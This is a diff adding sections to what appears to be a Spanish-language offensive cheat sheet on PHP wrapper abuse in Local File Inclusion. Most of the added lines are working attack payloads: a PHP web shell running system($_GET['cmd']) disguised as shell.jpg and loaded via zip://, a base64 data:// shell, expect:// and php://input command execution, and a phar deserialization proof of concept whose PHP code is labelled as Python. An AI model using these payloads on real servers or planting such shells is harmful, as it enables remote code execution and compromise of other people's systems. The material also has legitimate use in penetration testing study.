@@ -1804,13 +1804,76 @@ php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/r
 
 ##### Wrapper zip://
 
+```bash
+echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
+zip payload.zip payload.php;
+mv payload.zip shell.jpg;
+rm payload.php
+
+http://example.com/index.php?page=zip://shell.jpg%23payload.php
+```
+
 ##### Wrapper data://
+
+```bash
+http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
+NOTA: El payload es "<?php system($_GET['cmd']);echo 'Tenemos Shell!'; ?>"
+```
 
 ##### Wrapper expect://
 
+```bash
+http://example.com/index.php?page=expect://id
+http://example.com/index.php?page=expect://ls
+```
+
 ##### Wrapper input://
 
+Especificamos nuestro payload a través de un parámetro POST:
+
+```bash
+http://example.com/index.php?page=php://input
+POST DATA: <? system('id'); ?>
+```
+
+También puede hacerse desde terminal de la siguiente forma:
+
+```bash
+$~ echo "<? system('id'); ?>" | POST http://example.com/index.php?page=php://input
+```
+
 ##### Wrapper phar://
+
+Crea un archivo **phar** con un objeto serializado en sus metadatos:
+
+```python
+// create new Phar
+$phar = new Phar('test.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ? >');
+
+// add object of any class as meta data
+class AnyClass {}
+$object = new AnyClass;
+$object->data = 'rips';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+```
+
+Si llegados a este punto, cualquier operación es realizada en nuestro archivo Phar existente haciendo uso del wrapper **phar://**, entonces la metadata serializada es deserializada y por tanto interpretada.
+
+Si esta aplicación contase con una clase llamada **AnyClass** y posee el método mágico __destruct() o __wakeup() definidos, entonces estos serán invocados automáticamente.
+
+```python
+class AnyClass {
+    function __destruct() {
+        echo $this->data;
+    }
+}
+// output: rips
+include('phar://test.phar');
+```
 
 #### SQLI
 
